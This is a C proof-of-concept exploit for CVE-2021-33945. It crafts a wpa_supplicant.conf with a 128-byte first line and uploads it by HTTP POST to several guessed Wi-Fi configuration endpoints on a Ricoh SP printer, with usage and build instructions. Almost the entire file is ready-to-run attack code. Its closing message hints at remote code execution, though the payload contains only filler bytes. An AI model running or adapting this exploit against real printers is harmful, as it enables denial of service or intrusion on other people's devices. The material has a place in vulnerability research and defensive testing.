/*
 * Ricoh SP Series wpa_supplicant Stack Overflow PoC — CVE-2021-33945
 * ====================================================================
 * Author: André Henrique (@mrhenrike) | União Geek
 *
 * Triggers stack overflow in wpa_supplicant_conf_parser() via a crafted
 * wpa_supplicant.conf file uploaded to the Ricoh printer's web interface.
 *
 * The first line of the conf must be > 0x38 bytes to trigger the overflow.
 * This PoC uploads the malicious conf via HTTP POST to the printer's
 * WiFi configuration endpoint.
 *
 * Usage: ./exploit <host> <port>
 *
 * Build: gcc -O2 -o exploit source.c
 *
 * References:
 *   https://github.com/Ainevsia/CVE-Request/tree/main/Ricoh/1
 *   https://nvd.nist.gov/vuln/detail/CVE-2021-33945
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#ifdef _WIN32
  #include <winsock2.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef int socklen_t;
#else
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <netdb.h>
#endif

#define OVERFLOW_LEN 0x80   /* 128 bytes — well above 0x38 threshold */
#define CONF_HDR     "ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=wheel\n"

static char *build_wpa_conf(void) {
    /* Craft a wpa_supplicant.conf whose first line > 0x38 bytes */
    static char buf[4096];
    memset(buf, 'A', OVERFLOW_LEN);
    buf[OVERFLOW_LEN] = '\n';
    strncpy(buf + OVERFLOW_LEN + 1, CONF_HDR, sizeof(buf) - OVERFLOW_LEN - 2);
    buf[sizeof(buf) - 1] = '\0';
    return buf;
}

static int http_post(const char *host, int port, const char *path,
                     const char *body, int body_len) {
    int sock;
    char req[8192];
    char resp[4096];
    struct sockaddr_in addr;
    struct hostent *he;

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);
#endif

    he = gethostbyname(host);
    if (!he) {
        fprintf(stderr, "[-] Cannot resolve %s\n", host);
        return -1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return -1; }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((unsigned short)port);
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[-] Cannot connect to %s:%d\n", host, port);
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        return -1;
    }

    snprintf(req, sizeof(req),
        "POST %s HTTP/1.0\r\n"
        "Host: %s:%d\r\n"
        "Content-Type: multipart/form-data; boundary=----RICOH_BoF\r\n"
        "Content-Length: %d\r\n"
        "\r\n"
        "%s",
        path, host, port, body_len, body);

    send(sock, req, strlen(req), 0);

    int n = recv(sock, resp, sizeof(resp) - 1, 0);
    if (n > 0) {
        resp[n] = '\0';
        printf("[*] Response: %.200s\n", resp);
    }

#ifdef _WIN32
    closesocket(sock);
    WSACleanup();
#else
    close(sock);
#endif
    return 0;
}

int main(int argc, char *argv[]) {
    const char *host = argc > 1 ? argv[1] : "127.0.0.1";
    int port = argc > 2 ? atoi(argv[2]) : 80;

    printf("[*] CVE-2021-33945 Ricoh SP wpa_supplicant Stack Overflow PoC\n");
    printf("[*] Target: %s:%d\n", host, port);

    char *conf = build_wpa_conf();
    int conf_len = (int)strlen(conf);
    printf("[*] Conf payload length: %d bytes (threshold: 0x38=%d)\n",
           conf_len, 0x38);

    /* Build multipart body */
    char body[8192];
    int blen = snprintf(body, sizeof(body),
        "------RICOH_BoF\r\n"
        "Content-Disposition: form-data; name=\"wpa_conf\"; filename=\"wpa_supplicant.conf\"\r\n"
        "Content-Type: text/plain\r\n"
        "\r\n"
        "%s\r\n"
        "------RICOH_BoF--\r\n",
        conf);

    /* Try known Ricoh WiFi config endpoints */
    const char *paths[] = {
        "/wifi_config.cgi",
        "/cgi-bin/wifi_config.cgi",
        "/web/entry.cgi?id=wifi",
        NULL
    };
    for (int i = 0; paths[i]; i++) {
        printf("[*] Trying endpoint: %s\n", paths[i]);
        if (http_post(host, port, paths[i], body, blen) == 0) {
            printf("[+] Payload sent to %s — check if device crashed (DoS) or shells back (RCE)\n", paths[i]);
        }
    }

    printf("[*] Done.\n");
    return 0;
}
